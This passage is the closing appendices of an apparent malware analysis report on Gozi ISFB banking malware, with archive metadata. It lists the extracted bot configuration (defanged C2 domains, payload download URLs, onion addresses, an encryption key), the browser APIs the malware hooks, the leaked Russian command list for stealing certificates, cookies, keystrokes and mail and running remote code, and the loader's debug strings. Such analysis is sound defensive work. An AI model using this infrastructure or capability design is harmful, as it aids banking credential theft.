[u'1000']\nDGA TLDs        [[u'com', u'ru', u'org']]\nIP Service       [u'curlmyip[.]net']\nBC Timeout       [u'10']\nTimer          [u'20']\nServer         [u'110']\n64-bit DLL URLs     [[u'zjsgyyq[.]com/leader/pdf.zip',\nu'portaldobomretiro[.]net/wp-admin/network/2.bin', u'colourshield[.]com/m1/pdd.rtf',\nu'mukeshjshah[.]com/admuin/litecoin.rar', u'petras[.]name/fotos/zek.dmg',\nu'sbmpowisle.dag[.]pl/js/989999.sh', u'cdn.robatop[.]at/jvassets/zarch/xx.dmg']]\nEncryption key     [u'Nf6lU8d5X0i1Wr7V']\nValue 11        [u'1']\nConfig Timeout     [u'1200']\nDGA CRC         [u'0x4eb7d2ca']\nDomains         [[u'inc.robatop[.]at/wpapi', u'torafy[.]cn/wpapi',\nu'app.tohio[.]at/wpapi', u'scr.tohio[.]at/wpapi', u'yraco[.]cn/wpapi',\nu'poi.robatop[.]at/wpapi', u'login.cdrome[.]at/wpapi', u'az.popdel[.]at/wpapi',\nu'io.ledal[.]at/wpapi', u'in.ledal[.]at/wpapi', u'api.galio[.]at/wpapi',\nu'ssl.lottos[.]at/wpapi', u'harent[.]cn/wpapi']]\nDGA Base URL      [u'constitution[.]org/usdeclar.txt']\nTask Timeout      [u'240']\nTOR Domains       [[u'4fsq3wnmms6xqybt[.]onion/wpapi',\nu'em2eddryi6ptkcnh[.]onion/wpapi', u'nap7zb4gtnzwmxsv[.]onion/wpapi',\nu't7yz3cihrrzalznq[.]onion/wpapi']]\n32-bit DLL URLs     [u'zjsgyyq[.]com/leader/doc.zip',\nu'portaldobomretiro[.]net/wp-admin/network/1.bin',      \nu'colourshield[.]com/m1/dll.rtf', u'mukeshjshah[.]com/admuin/coin.rar',\nu'petras[.]name/fotos/dash.dmg', u'sbmpowisle.dag[.]pl/js/757575.sh',\nu'cdn.robatop[.]at/jvassets/zarch/x.rar']]\n\n## *Cape Sandbox B. Hooked APIs\n\n```\n\n-----\n\n```\nMozilla Firefox:\nPR_Read\nPR_Write\nPR_Close\nPR_Poll\nInternet Explorer:\nInternetReadFile\nInternetWriteFile\nInternetReadFileExA\nInternetReadFileExW\nHttpSendRequestA\nHttpSendRequestW\nHttpSendRequestExA\nHttpSendRequestExW\nInternetCloseHandle\nInternetQueryDataAvailable\nInternetStatusCallback\nInternetConnectA\nInternetConnectW\nHttpQueryInfoA\nHttpQueryInfoW\nHttpAddRequestHeadersA\nHttpAddRequestHeadersW\nHttpOpenRequestW\nInternetSetStatusCallback\nWindows Explorer:\nCreateProcessA\nCreateProcessW\nCreateProcessAsUserA\nCreateProcessAsUserW\nWindows Explorer:\nRegGetValueW\nRegQueryValueExW\nGoogle Chrome & Opera Browser:\nWSARecv\nWSASend\nclosesocket\nrecv\nLoadLibraryExW\nAdvapi32.dll:\nCryptGetUserKey\n\n## C. Original Commands from Leaked ISFB v2.13* in Russian\n\n```\n\n-----\n\n```\nGET_CERTS экспортировать и выслать сертификаты, установленные в системном хранилище\nWindows. \n  Для XP выгружает, также, неэкспортируемые сертификаты.\nGET_COOKIES - собрать cookie FF и IE, SOL-файлы Flash, упаковать их с сохранением\nструктуры \n  каталогов и выслать на сервер.\nCLR_COOKIES - удалить cookie FF и IE, SOL-файлы Flash.\nGET_SYSINFO - собрать системную информацию: тип процессора, версию ОС, список\nпроцессов, список\n  драйверов, список установленных программ.\nKILL - убить ОС (работает только с правами администратора)\nREBOOT - перезагрузить ОС\nGROUP=n - сменить ID группы бота на n\nLOAD_EXE=URL - загрузить файл с указанного URL и запустить его\nLOAD_REG_EXE=URL- загрузить файл с указанного URL, зарегистрировать его в autirun и\nзапустить\nLOAD_UPDATE=URL - загрузить апдейт программы и запустить\nGET_LOG - отправить внутренний лог на сервер\nGET_FILES=* - найти все файлы, соответствующие заданной маске, и отправить на сервер\nSLEEP=n - остановить обработку очереди команд на n миллисекунд. (используется при\nдолгих операциях)\nSEND_ALL - отправить все данные из очереди на отправку немедленно. В противном\nслучае, данные оправляются \n  по таймеру.\nLOAD_DLL=URL[,URL] - загрузить по указанному URL DLL и инжектить её в процесс\nexplorer.exe.\n  первый URL для 32х-битной DLL, второй - для 64х-битной.\nSOCKS_START=IP:PORT - запустить сокс4\\5 сервер (при его наличии)\nSOCKS_STOP - остановить сокс4\\5 сервер\nGET_KEYLOG - отправить данные кейлоггера (при его наличии)\nGET_MAIL - активировать граббер E-Mail (при наличии) и отправить, полученные от него,\nданные\nGET_FTP - активировать граббер FTP (при наличии) и отправить, полученные от него,\nданные\nSELF_DELETE - удалить софт из системы, включая все файлы и ключи реестра\nURL_BLOCK=URL - заблокировать доступ ко всем URL удовлетворяющим заданной маске\nURL_UNBLOCK=URL - разблокировать доступ к URL, удовлетворяющим заданной маске, ранее\nзаблокированным командой URL_BLOCK\nFORMS_ON - включить граббер HTTP форм (если есть дефайн _ALWAYS_HTTPS, то граббер\nHTTPs остаётся включен всегда)\nFORMS_OFF - отключить граббер HTTP форм\nKEYLOG_ON[= list] - включить кейлог, для заданного списка процессов\nKEYLOG_OFF - отключить кейлог\nLOAD_INI=URL - загрузить упакованный INI-файл с указанного URL, сохранить его в\nрееестре и использовать вместо INI-файла,\n   прикреплённого к софту с помощью билдера. INI-файл должен быть упакован и\nподписан.\nLOAD_REG_DLL = name, URL[,URL] - загрузить DLL по указанному URL, сохранить её под\nзаданным именем и зарегистрировать для\n\n```\n\n-----\n\n```\n   автоматической загрузки после каждого запуска системы\nUNREG_DLL = name - удалить из автоматической загрузки DLL c заданным именем\n\n## D. ISFB client.dll \"RM3\" Function and Debug Statements\n\n```\n\n-----\n\n```\nLdrStartLoaderProcess\n[%s:%u] RM3 loader version %u.%u build %u on Windows %u.%u.%u %s\nLdr2LoadIni\n[%s:%u] Attached LOADER.INI signature check failed, error %u\n[%s:%u] No attached LOADER.INI found\nLdr2LoadFile\n[%s:%u] File 0x%X of %u bytes is received over HTTP\n[%s:%u] File 0x%X has an invalid signature\n[%s:%u] Failed to receive file 0x%X, error %u\nLdrIsElevated\n[%s:%u] IsElevated = %u, IntegrityLevel = %u\nLdr2GetLoaderModule\n[%s:%u] A startup module of %u bytes is received\n[%s:%u] Invalid STARTUP module is supplied\n[%s:%u] Failed to load a STARTUP module, error %u\nLdr2SaveModulesToRegistry\n[%s:%u] Error 0x%X writing value \"%S\" of key \"%S\"\n[%s:%u] Error 0x%X creating 0x%X hive subkey: \"%S\"\nLdr2SaveAllModules\n[%s:%u] Error %u writing 64-bit modules to the key \"%S\"\n[%s:%u] Error %u writing 32-bit modules to the key \"%S\"\n[%s:%u] Error %u creating hive 0x%X key \"%S\"\nLdr2MakeRunRecord\n[%s:%u] Not enough memory (%u)\nLdr2RegEnumCallback\n[%s:%u] Error %u writing autorun value of \"%S\"\n[%s:%u] Error %u writing startup script to the regstry value: \"%S\\%S\"\n[%s:%u] Error %u saving all module to key: \"%S\"\nLdr2MakeEncodedImage\n[%s:%u] Invalid PE/PEX module BL.DLL\n[%s:%u] BlExecuteDllImage() export is not found\n[%s:%u] Invalid PE/PEX module size of BL.DLL\nReplaceSubStr\nLdr2SetupModules\n[%s:%u] Integrity level: 0x%x, required elevation\n[%s:%u] Elevation failed\n[%s:%u] Loading a startup module\n[%s:%u] Waiting for %u seconds\n[%s:%u] Walking through the registry\n[%s:%u] Walking through the registry failed, error %u\n[%s:%u] Failed to make a startup script, error %u\n[%s:%u] Restarting the loader executable from \"%S\"\n[%s:%u] Successfully restarted\n[%s:%u] Failed to restart the loader executable, error %u\nLdr2LoadModules\n[%s:%u] An empty page received, exiting the loader\n[%s:%u] Error %u(0x%X) downloading module 0x%X of %u\nLdr2DisableIeDialogs\n[%s:%u] Error 0x%X writing key value: \"%S\\%S\"\nLdr2LoaderMain\n[%s:%u] Staying idle for %u seconds\n[%s:%u] Main loop is active, loading modules\n[%s:%u] Main loop is ended. %u modules are loaded, status: %u\n[%s:%u] The shutdown event fired or an error occured, exiting\n[%s:%u] Error %u creating the main loop timer\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-08-25 - Let's Learn- In-Depth Reversing of Recent Gozi ISFB Banking Malware Version 2.16-2.17 (portion of ISFB v3) & -loader.dll-client.dll-.pdf"
    ],
    "report_names": [
        "2018-08-25 - Let's Learn- In-Depth Reversing of Recent Gozi ISFB Banking Malware Version 2.16-2.17 (portion of ISFB v3) & -loader.dll-client.dll-.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535975,
    "ts_updated_at": 1743041145,
    "ts_creation_date": 1653712802,
    "ts_modification_date": 1653712802,
    "files": {
        "pdf": "https://archive.orkl.eu/a9a26424e8cccd99bf7543d60581f5dd1140c711.pdf",
        "text": "https://archive.orkl.eu/a9a26424e8cccd99bf7543d60581f5dd1140c711.txt",
        "img": "https://archive.orkl.eu/a9a26424e8cccd99bf7543d60581f5dd1140c711.jpg"
    }
}